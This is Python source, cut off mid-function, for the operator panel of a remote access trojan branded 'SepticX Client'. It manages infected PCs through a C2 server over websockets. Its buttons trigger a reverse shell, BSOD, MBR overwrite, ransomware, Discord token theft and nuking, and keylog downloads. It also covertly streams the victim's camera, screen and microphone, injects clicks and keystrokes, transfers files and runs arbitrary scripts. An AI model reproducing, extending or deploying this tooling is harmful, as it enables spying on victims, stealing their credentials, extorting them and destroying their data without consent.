from tkinter import *
from CTkToolTip import *
from random import randbytes
from PIL import Image, ImageTk
from colorama import Style, Fore
from tkinter import filedialog as fd
from bit import SUPPORTED_CURRENCIES
from win10toast import ToastNotifier
from cryptography.fernet import Fernet
from websocket import create_connection
import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, datetime, pyaudio, CTkTable, tkinter, shutil, base64, numpy as np, json, fade, math, time, glob, zlib, cv2, ssl, os, io

customtkinter.set_appearance_mode("dark")


class Profile(customtkinter.CTkFrame):
    def __init__(self, master, parent=None, config=None, row=0, rowspan=1, padx=20, pady=20, title=False):
        super().__init__(master)

        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")

        for i in range(1): # Set 1 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(7): # Set 7 columns
            self.columnconfigure(i, weight= 1)

        if title:
            emoji_widget = customtkinter.CTkButton(self, text="Country", fg_color="gray", text_color="Black", corner_radius=0)
            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)

            username_widget = customtkinter.CTkButton(self, text="Desktop Username", fg_color="gray", text_color="Black", corner_radius=0)
            username_widget.grid(row=0, column=1, columnspan=2, sticky="nsew", padx=1, pady=0)

            ip_address_widget = customtkinter.CTkButton(self, text="Ip Address", fg_color="gray", text_color="Black", corner_radius=0)
            ip_address_widget.grid(row=0, column=3, columnspan=2, sticky="nsew", padx=1, pady=0)

            ip_address_widget = customtkinter.CTkButton(self, text="Status", fg_color="gray", text_color="Black", corner_radius=0)
            ip_address_widget.grid(row=0, column=5, columnspan=1, sticky="nsew", padx=1, pady=0)

            address_widget = customtkinter.CTkButton(self, text="Other", fg_color="gray", text_color="Black", corner_radius=0)
            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=1, pady=0)
            return

        username = config['username']
        ip_address = config['ip_address']
        flag = config['flag']

        response = requests.get(flag)

        img = Image.open(io.BytesIO(response.content))
        image = customtkinter.CTkImage(dark_image=img, light_image=img)

        emoji_widget = customtkinter.CTkButton(self, text="", image=image, fg_color="White", text_color="Black", command=lambda:(self.clipboard_clear(), self.clipboard_append(ipinfo['country'])), corner_radius=0)
        emoji_widget.grid(row=0, column=0, padx=0, sticky="nsew")

        CTkToolTip(emoji_widget, ipinfo['country'])

        username_widget = customtkinter.CTkButton(self, text=username, fg_color="White", text_color="Black", command=lambda:(self.clipboard_clear(), self.clipboard_append(username)), corner_radius=0)
        username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

        CTkToolTip(username_widget, "Click to copy")

        ip_address_widget = customtkinter.CTkButton(self, text=ip_address, fg_color="White", command=lambda:(self.clipboard_clear(), self.clipboard_append(ip_address)), text_color="Black", corner_radius=0)
        ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

        CTkToolTip(ip_address_widget, "Click to copy")

        control_widget = customtkinter.CTkButton(self, text="More options", command=lambda: Controller(parent, f"{username}|{ip_address}"), corner_radius=0)
        control_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)

class Controller(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
        self.server_address = master.server_address
        self.server_key = master.server_key
        self.master = master

        self.master = master

        for i in range(8): # Set 8 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(4): # Set 4 columns
            self.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=lambda: self.destroy())
        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        frames = {
            "PC Management": [
                (None, 'Reverse Shell'),
                ('bsod', 'Start BSOD'),
                ('mbr', 'Overwrite MBR'),
                ('restart', 'Restart Pc'),
                ('shutdown', 'Shutdown Pc'),
                (None, 'Run PY script'),
            ],
            "Credentials": [
                ('sendCreds', 'Resend Credentials'),
                (None, 'Logged Tokens'),
                (None, 'Logged Keystrokes'),
                ('nukeTokens', 'Nuke Discord Tokens'),
                (None, 'Update Discord Webhook'),
            ], 
            "Streaming": [
                ('streamCamera', 'Stream Camera'),
                ('streamDesktop', 'Stream Desktop'),
                ('streamAudio', 'Stream Audio'),
                (None, 'File Manager')
            ],
            "Misc": [
                ('startRansomware', 'Start Ransomware'),
                ('stopRansomware', 'Stop Ransomware'),
                (None, 'Show Message Box'),
                ('Troll', 'Start Trollware'),
                ('stopTroll', 'Stop Trollware'), 
                ('clean', 'Uninstall Client')
            ]
        }

        for count, (title, button_configs) in enumerate(frames.items()):

            frame = customtkinter.CTkFrame(self)
            frame.grid(row=1, column=count, rowspan=7, padx=20, pady=20, sticky="nsew")

            for i in range(6): # Set 6 rows
                frame.rowconfigure(i, weight= 1)
        
            for i in range(1): # Set 1 column
                frame.columnconfigure(i, weight= 1)

            label = customtkinter.CTkLabel(frame, text=title)
            label.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

            for count, (command, button_name) in enumerate(button_configs):

                if button_name == "Reverse Shell":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda: Shell(master, target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Run PY script":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: self.master.send_command(command, target, True), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Update Discord Webhook":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda: self.get_webhook_input("Enter your new Webhook", target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Show Message Box":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda: self.get_message_box(target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Logged Tokens":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=self.download_tokens, 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Logged Keystrokes":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=self.download_keylogs, 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif command == "streamCamera":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: (self.master.send_command(command, target), Video(master, target, 0)), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif command == "streamDesktop":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: (self.master.send_command(command, target), Video(master, target, 1)), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif command == "streamAudio":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: (self.master.send_command(command, target), Audio(master, target)), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "File Manager":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: FileManager(master, target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                else:
                    btn = customtkinter.CTkButton(frame, text=button_name, command=lambda command = command: (self.master.send_command(command, target), tkinter.messagebox.showinfo("SepticX Client", "Successfully executed command")), fg_color="#1b6e63",
                        text_color="white")

                btn.grid(row=count + 1, column=0, padx=20, pady=5, sticky="ew")

    def send_message_box(self, frame, title, message, target):
        messagebox = self.messagebox
        self.master.send_command(f"messageBox|{title}|{message}|{messagebox}", target)

        tkinter.messagebox.showinfo("SepticX Client", "Successfully sent MessageBox")

        frame.destroy()

    def set_message_box(self, messagebox):
        self.messagebox = messagebox

    def get_message_box(self, target):
        cover_frame = customtkinter.CTkFrame(None)
        cover_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            cover_frame.rowconfigure(i, weight= 1)
        
        for i in range(3): # Set 1 columns
            cover_frame.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(cover_frame, text="X", fg_color="#435250", command=cover_frame.destroy)
        btn.grid(row=0, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")

        self.messagebox = "Error"

        self.messageboxes = [
            "Error",
            "Question",
            "Warning"
        ]

        label = customtkinter.CTkLabel(cover_frame, text="Select a message box type")
        label.grid(row=2, columnspan=3, pady=20)
        
        for count, messagebox in enumerate(self.messageboxes):
            pil_image = Image.open(f"assets\\{messagebox}.png")
            image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image)

            btn = customtkinter.CTkButton(cover_frame, text=messagebox, image=image, command=lambda count=count: self.set_message_box(count))
            btn.grid(row=3, column=count, padx=20, stick="nsew")

        title = customtkinter.CTkEntry(cover_frame, placeholder_text="Enter MessageBox Title")
        title.grid(row=5, column=1, pady=20, stick="nsew")

        message = customtkinter.CTkEntry(cover_frame, placeholder_text="Enter MessageBox Message")
        message.grid(row=6, column=1, pady=20, stick="nsew")

        submit = customtkinter.CTkButton(cover_frame, text="Send MessageBox", command=lambda: self.send_message_box(cover_frame, title.get(), message.get(), target))
        submit.grid(row=8, column=1, pady=20, stick="nsew")

    def download_keylogs(self):
        tkinter.messagebox.showinfo("SepticX Client", "Downloading logs...")
        download = requests.get(f'https://{self.server_address}/logs', data={'key': self.server_key}).content

        with open('logs.zip', 'wb') as file:
            file.write(download)

        tkinter.messagebox.showinfo("SepticX Client", "Logs downloaded to logs.zip")

    def download_tokens(self):
        tkinter.messagebox.showinfo("SepticX Client", "Downloading logs...")
        tokens = requests.get(f'https://{self.server_address}/tokens', data={'key': self.server_key}).json()

        with open('tokens.txt', 'w+') as file:
            file.write('\n'.join(tokens))

        tkinter.messagebox.showinfo("SepticX Client", "Tokens downloaded to tokens.txt")

    def update_webhook(self, frame, webhook, target):
        self.master.send_command(f"updateWebhook|{webhook}", target)
        tkinter.messagebox.showinfo("SepticX Client", "Successfully updated webhook")
        
        frame.destroy()

    def get_webhook_input(self, query, target):
        cover_frame = customtkinter.CTkFrame(None)
        cover_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            cover_frame.rowconfigure(i, weight= 1)
        
        for i in range(11): # Set 11 columns
            cover_frame.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(cover_frame, text="X", fg_color="#435250", command=cover_frame.destroy)
        btn.grid(row=0, column=0, columnspan=11, padx=5, pady=5, sticky="nsew")

        entry = customtkinter.CTkEntry(cover_frame, placeholder_text=query)
        entry.grid(row=5, column=3, columnspan=3, sticky="nsew")

        submit = customtkinter.CTkButton(cover_frame, text=query, command=lambda: self.update_webhook(cover_frame, entry.get(), target))
        submit.grid(row=5, column=6, columnspan=3, sticky="nsew")


class Video(customtkinter.CTkToplevel):
    def __init__(self, master, target, option=None):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.master = master

        if not option:
            self.endpoint = "showCamera"
        else:
            self.endpoint = "showScreen"

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        for i in range(11):  # Set 11 rows
            self.rowconfigure(i, weight=1)

        for i in range(1):  # Set 1 column
            self.columnconfigure(i, weight=1)

        self.minsize(500, 300)
        self.title(f"{target}'s {self.endpoint[4:]}")
        self.protocol("WM_DELETE_WINDOW", lambda: (self.kill_proc()))
        self.lift()

        self.width, self.height = (500, 300)

        screen = customtkinter.CTkLabel(self, text="Loading...")
        screen.grid(row=1, column=0, rowspan=10, sticky="nsew")
        screen.bind("<Button-1>", self.on_image_click)  # Bind left mouse click to the image
        self.bind("<KeyPress>", self.on_key_press)  # Bind keyboard events
        self.bind("<KeyRelease>", self.on_key_release)  # Bind keyboard events
        self.screen = screen

        ws = websocket.WebSocketApp(
            f"wss://{self.server_address}/api/ws/{self.endpoint}",
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.kill_proc,
        )

        threading.Thread(target=ws.run_forever).start()

    def on_open(self, ws):
        ws.send(self.server_key)
        ws.send(self.target)

    def on_message(self, ws, recv_data):
        image = Image.open(io.BytesIO(zlib.decompress(base64.b64decode(recv_data))))
        self.update_display(image)

    def kill_proc(self):
        command = self.endpoint.replace("show", "stop").replace("Screen", "Desktop")

        try:
            self.master.ws.send(
                json.dumps(
                    {
                        "code": command,
                        "target": self.target,
                    }
                )
            )
        except:
            pass

        self.stop = True
        self.destroy()

    def update_display(self, image):
        image = customtkinter.CTkImage(
            dark_image=image,
            light_image=image,
            size=(self.winfo_width() * 0.8, self.winfo_height() * 0.8),
        )
        self.screen.configure(image=image, text="")

    def on_image_click(self, event):
        widget_width = self.screen.winfo_width()
        widget_height = self.screen.winfo_height()

        normalized_x = event.x / widget_width / 0.8
        normalized_y = event.y / widget_height / 0.92

        self.handle_click(normalized_x, normalized_y)

    def handle_click(self, x, y):
        print(f"Clicked at normalized coordinates: ({x:.2f}, {y:.2f})")
        self.master.ws.send(
                json.dumps(
                    {
                        "code": f"click|{x}|{y}",
                        "target": self.target
                    }
                )
            )

    def on_key_press(self, event):
        key = event.keysym
        self.handle_key_press(key)

    def handle_key_press(self, key):
        print(f"Key pressed: {key}")
        self.master.ws.send(
            json.dumps(
                {
                    "code": f"pressKey|{key}",
                    "target": self.target,
                }
            )
        )

    def on_key_release(self, event):
        key = event.keysym
        self.handle_key_release(key)

    def handle_key_release(self, key):
        print(f"Key released: {key}")
        self.master.ws.send(
            json.dumps(
                {
                    "code": f"releaseKey|{key}",
                    "target": self.target,
                }
            )
        )


class Audio(customtkinter.CTkToplevel):
    def __init__(self, master, target):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.master = master
        self.stop = False

        self.minsize(300, 300)
        self.title(f"{target} Audio")
        self.lift()
        self.protocol("WM_DELETE_WINDOW", lambda: (self.kill_proc()))

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        screen = customtkinter.CTkLabel(self, text="Listening to audio...")
        screen.grid(row=2, column=0, rowspan=9, sticky="nsew")

        slider = customtkinter.CTkSlider(self, from_=0, to=500, number_of_steps=500, command=lambda value:tooltip.configure(message=f"{value} %"))
        slider.grid(row=1, column=0)
        slider.set(100)

        tooltip = CTkToolTip(slider, message="100%")

        self.slider = slider
        self.screen = screen
        threading.Thread(target=self.play_audio).start()

    def play_audio(self):
        chunk = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 8000
        RECORD_SECONDS = 5
        p = pyaudio.PyAudio()

        stream = p.open(format = FORMAT,
            channels = CHANNELS,
            rate = RATE,
            input = True,
            output = True,
            frames_per_buffer = chunk)

        while not self.stop:
            GAIN = self.slider.get() / 100
            try:
                audio_data = zlib.decompress(base64.b64decode(ws.recv()))
            
                audio_np = np.frombuffer(audio_data, dtype=np.int16)
                audio_np = np.clip(audio_np * GAIN, -32768, 32767).astype(np.int16)

                # Convert back to bytes and write to stream
                stream.write(audio_np.tobytes())
            except Exception as e:
                print(e)
                ws = self.connect()

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/playAudio")
                ws.send(self.server_key)
                ws.send(self.target)
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass

    def kill_proc(self):
        try:
            self.master.ws.send(json.dumps({
                "code": "stopAudio",
                "target": self.target
            }))
        except:
            pass

        self.stop = True
        self.destroy()


class Shell(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.stop = False
        self.ws = self.connect()
        self.row = 0

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        terminal_frame = customtkinter.CTkTextbox(self)
        terminal_frame.grid(row=1, column=0, rowspan=10, columnspan=4, sticky="nsew")

        terminal_frame.configure(state="disabled")

        self.terminal_frame = terminal_frame

        text_variable = StringVar(value="")

        entry = customtkinter.CTkEntry(self, placeholder_text="Enter command", textvariable=text_variable)
        entry.grid(row=11, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")

        self.entry = text_variable

        submit = customtkinter.CTkButton(self, text="Submit", command=lambda: threading.Thread(target=self.run_command).start())
        submit.grid(row=11, column=3, padx=5, pady=5, sticky="nsew")

        threading.Thread(target=self.read_command_outputs).start()

    def kill_proc(self):
        self.stop = True
        self.destroy()
        try:
            self.ws.close()
        except:
            pass

    def read_command_outputs(self):
        while True:
            try:
                
                recv = self.ws.recv()
            except (websocket.WebSocketException, WindowsError):
                self.ws = self.connect()
                continue

            self.add_text(recv)

    def run_command(self):
        command = self.entry.get()

        self.entry.set("")
        self.add_text(f"> {command}")

        if not command:
            return

        while True:
            try:
                self.ws.send(command)
                break
            except (websocket.WebSocketException, WindowsError):
                self.ws = self.connect()

    def add_text(self, text):
        self.row += 1

        self.terminal_frame.configure(state="normal")
        self.terminal_frame.insert(f"{self.row}.0", text + "\n")
        self.terminal_frame.configure(state="disabled")

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/readShell")
                ws.send(self.server_key)
                ws.send(self.target)
                self.ws = ws
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass

class ProgressBar(customtkinter.CTkToplevel):
    def __init__(self, transfer_type="Upload"):
        super().__init__(None)
        self.geometry("400x300")
        self.title("Progress Bar: 0%")
        self.lift()

        self.transfer_type = transfer_type

        for i in range(2): # Set 2 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        self.label = customtkinter.CTkLabel(self, text=f"{transfer_type} Progress: 0%")
        self.label.grid(row=0, column=0, pady=10)

        self.progress_bar = customtkinter.CTkProgressBar(master=self)
        self.progress_bar.grid(row=1, column=0, pady=10)
        self.progress_bar.set(0.01)

    def update(self, value):
        self.label.configure(text=f"{self.transfer_type} Progress: {round(value * 100)}%")
        self.title(f"Progress Bar: {round(value * 100)}%")
        self.progress_bar.set(value)
        self.lift()

class File(customtkinter.CTkFrame):
    def __init__(self, master, parent=None, filename="", config=None, row=0, rowspan=1, padx=20, pady=20, title=False, root=False):
        super().__init__(master)

        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")

        for i in range(1): # Set 1 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(7): # Set 7 columns
            self.columnconfigure(i, weight= 1)

        if title:
            emoji_widget = customtkinter.CTkButton(self, text="File Name", fg_color="gray", text_color="Black", corner_radius=0)
            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)

            username_widget = customtkinter.CTkButton(self, text="Date Modified", fg_color="gray", text_color="Black", corner_radius=0)
            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

            ip_address_widget = customtkinter.CTkButton(self, text="File Size", fg_color="gray", text_color="Black", corner_radius=0)
            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

            address_widget = customtkinter.CTkButton(self, text="Return", fg_color="red", text_color="Black", command=lambda: threading.Thread(target=parent.list_directory, args=('\\'.join(parent.current_directory.split("\\")[:-1]),)).start(), corner_radius=10)
            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
            return

        date_modified = datetime.datetime.fromtimestamp(config['modified']).strftime("%Y/%m/%d %I:%M %p")
        file_size = config['file_size']

        if config['directory']:
            filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1] if not root else filename, fg_color="White", text_color="Black", corner_radius=0)
            filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")

            date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color="Black", corner_radius=0)
            date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

            file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color="Black", corner_radius=0)
            file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

            view_widget = customtkinter.CTkButton(self, text="View Directory", command=lambda: threading.Thread(target=parent.list_directory, args=(filename,)).start(), corner_radius=0)
            view_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
            return

        filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color="Black", corner_radius=0)
        filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")

        date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color="Black", corner_radius=0)
        date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

        file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color="Black", corner_radius=0)
        file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

        download_widget = customtkinter.CTkButton(self, text="Download", command=lambda: threading.Thread(target=parent.download, args=(filename, file_size)).start(), corner_radius=0)
        download_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)

class FileManager(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.stop = False
        self.ws = self.connect()
        self.current_directory = ""

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(2): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, columnspan=1, padx=2, pady=5, sticky="nsew")

        upload_btn = customtkinter.CTkButton(self, text="Upload", fg_color="#435250", command=lambda: threading.Thread(target=self.upload).start())
        upload_btn.grid(row=0, column=1, columnspan=1, padx=2, pady=5, sticky="nsew")

        scrollable_frame = customtkinter.CTkScrollableFrame(self, label_text="Current Directory")

        for i in range(15): # Set 15 rows
            scrollable_frame.rowconfigure(i, weight=1)
        
        for i in range(15): # Set 15 columns
            scrollable_frame.columnconfigure(i, weight=1)

        # scrollable_frame.grid(row=1, column=0, rowspan=10, columnspan=1, sticky="nsew")

        scrollable_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=2, rowspan=10)

        File(master=scrollable_frame, parent=self, title=True, pady=1)

        self.scrollable_frame = scrollable_frame
        threading.Thread(target=self.list_directory, args=("C:\\",)).start()

    def kill_proc(self):
        self.stop = True
        self.destroy()
        try:
            self.ws.close()
        except:
            pass

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/FileManager")
                ws.send(self.server_key)
                ws.send(self.target)
                self.ws = ws
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass

    def download(self, file_path, file_size):
        ws = create_connection(f"wss://{self.server_address}/api/ws/readFiles")
        ws.send(self.server_key)
        ws.send(self.target)
        
        self.ws.send(f"send_file|{file_path}")

        filename = file_path.split('\\')[-1]
        filename = f"downloads\\{filename}"
        
        offset = 0
        while True:
            if os.path.exists(filename):
                filename = filename[:filename.rindex('.')] + f" ({offset})" + filename[filename.rindex('.'):]
                offset += 1
                continue

            open(filename, 'w+').close()
            break

        # Remove string and commas to interpret as integer

        file_size = list(file_size[:-6])
        del file_size[-4::-4]
        file_size = int(''.join(file_size))

        print(file_size)
        
        chunk_size = 65536
        progress_bar = ProgressBar(transfer_type="Download")


        file_size = min(chunk_size, file_size) # Avoid division by zero
        count = 0

        with open(filename, 'ab') as file:
            while True:
                try:
                    data = ws.recv()
                    
                    print(count, data)

                    if data == "FIN":
                        if (count) > (file_size // chunk_size):
                            print(data, chunk_size, count)
                            progress_bar.destroy()
                            break
                        else:
                            continue

                    else:
                        count += 1

                    try:
                        file.write(zlib.decompress(base64.b64decode(data)))
                    except zlib.error as z:
                        print(z)

                    ws.send("ACK")

                except (websocket.WebSocketException, WindowsError) as e:
                    print(e)
                    progress_bar.destroy()
                    break

                print(file_size, chunk_size, count)
                
                progress = min(count / (file_size // chunk_size), 1)
                progress_bar.update(progress)
                
        tkinter.messagebox.showinfo("SepticX Client", "Successfully downloaded file, check the downloads folder.")
        progress_bar.destroy()

    def upload(self):
        chunk_size = 1024
        
        ws = create_connection(f"wss://{self.server_address}/api/ws/files")
        ws.send(self.server_key)
        ws.send(self.target)

        filetypes = (
            ('All files', '*'),
        )

        file_path = fd.askopenfilename(
            title='Open a file',
            initialdir=f'C:/Users/{os.environ["username"]}/Downloads',
            filetypes=filetypes
        ).replace("/", "\\")

        if not file_path:
            ws.close()
            return

        print(file_path)

        filename = file_path.split('\\')[-1]

        # while True:
        self.ws.send(f"recv_file|{self.current_directory}\\{filename}")
        time.sleep(5)
        progress_bar = ProgressBar(transfer_type="Upload")


        with open(file_path, 'rb') as file:
            data = file.read()
            length = len(data)

            for count in range(math.ceil(length / chunk_size)):
                chunk = data[count * chunk_size: (count + 1) * chunk_size]

                timer = threading.Timer(60, ws.close)
                timer.start()

                progress = min((count + 1) / math.ceil(length / chunk_size), 1)

                try:
                    ws.send(base64.b64encode(zlib.compress(chunk)).decode())
                except (websocket.WebSocketException, WindowsError, ConnectionError, OSError) as e:
                    print(e)
                    if timer.is_alive():
                        tkinter.messagebox.showerror("SepticX Client", f"Connection died during upload")
                        
                    else:
                        tkinter.messagebox.showerror("SepticX Client", f"Target timed out while sending")


                    ws.close()
                    timer.cancel()
                    progress_bar.destroy()
                    return

                finally:
                    timer.cancel()

                timer = threading.Timer(60, ws.close)
                timer.start()

                try:
                    ws.recv() # ACK message
                except (websocket.WebSocketException, WindowsError, ConnectionError, OSError, TimeoutError) as e:
                    ws = create_connection(f"wss://{self.server_address}/api/ws/files")
                    ws.send(self.server_key)
                    ws.send(self.target)

                finally:
                    timer.cancel()

                progress_bar.update(progress)
                    

        try:
            ws.send("FIN")
            ws.close()
        except:
            pass
        
        tkinter.messagebox.showinfo("SepticX Client", f"Successfully uploaded {filename} to {self.current_directory}")
        progress_bar.destroy()

    def list_directory(self, directory):
        for child in self.scrollable_frame.winfo_children()[1:]:
            try:
                child.destroy()
            except:
                pass

        self.scrollable_frame.configure(label_text=directory.replace("\\\\", "\\"))
        self.current_directory = directory

        while True:
            try:
                path = directory
                self.ws.send(f"listdir|{path}")
                recv_data = self.ws.recv()
                file_info = json.loads(recv_data)
                break
            except (websocket.WebSocketException, WindowsError):
                self.connect()

            except json.JSONDecodeError:
                continue

        row = 0
        for file in list(file_info):
            config = file_info[file]
            print(file, config)
            row += 1
            File(master=self.scrollable_frame, parent=self, filename=file, config=config, row=row, rowspan=1, pady=1, root="\\" not in directory)

        
class App(customtkinter.CTk):
    def __init__(self):
        os.system('')
        self.banner()

        super().__init__()

        self.geometry("1100x600")
        self.computers = []

        for i in range(21): # Set 21 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(18): # Set 18 columns
            self.columnconfigure(i, weight= 1)

        pil_image = Image.open("assets\\Title.png")
        image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image, size=(400, 90))

        title = customtkinter.CTkLabel(self, image=image, text="")
        title.grid(row=0, column=0, columnspan=24, sticky="nsew")
        self.toast = ToastNotifier()

        self.get_address()

    def send_command(self, command, target, file_prompt=False, recv=False):
        if file_prompt:
            filetypes = (
                ('All files', '*'),
            )

            filename = fd.askopenfilename(
                title='Open a file',
                initialdir='/',
                filetypes=filetypes
            )

            if not filename:
                return

            command = open(filename, 'r+').read()

        try:
            self.ws.send(json.dumps({
            "code": command,
            "target": target
            }))
            
            if recv:
                res = self.ws.recv()
                print(res)
                return res
        except websocket.WebSocketTimeoutException as e:
            print(e)
            tkinter.messagebox.showerror("SepticX Client", "Request timed out.")
            return None

    def get_address(self):
        key_frame = customtkinter.CTkFrame(self, corner_radius=15)
        key_frame.grid(row=1, column=6, padx=20, pady=20, sticky="nsew", columnspan=6, rowspan=18)
        
        for i in range(17): # Set 17 rows
            key_frame.rowconfigure(i, weight= 1)
        
        for i in range(17): # Set 17 columns
            key_frame.columnconfigure(i, weight= 1)

        server_address_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Server Address', justify=CENTER)
        server_address_entry.grid(row=7, column=0, columnspan=17, padx=20, pady=10, sticky="nsew")

        server_key_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Server Key', justify=CENTER)
        server_key_entry.grid(row=8, column=0, columnspan=17, padx=20, pady=10, sticky="nsew")

        response_label = customtkinter.CTkLabel(key_frame, text="")
        response_label.grid(row=15, column=4, columnspan=10, padx=0, pady=0, sticky="ew")

        submit = customtkinter.CTkButton(
            key_frame, text='Submit', 
            corner_radius=15, 
            command=lambda: self.connect_to_server(
                server_address_entry.get(), 
                server_key_entry.get(), 
                response_label
            )
        )
        submit.grid(row=14, column=4, columnspan=10, padx=20, pady=20, sticky="ew")

    def connect_to_server(self, server_address, server_key, label):
        server_address = server_address.replace('https://', '') \
            .replace('http://', '') \
            .replace('wss://', '') \
            .replace('ws://', '') \
            .split('/')[0]

        try:
            ws = create_connection(f"wss://{server_address}/api/ws/computers", sslopt={"cert_reqs": ssl.CERT_NONE})
        except (websocket.WebSocketException, ValueError) as e:
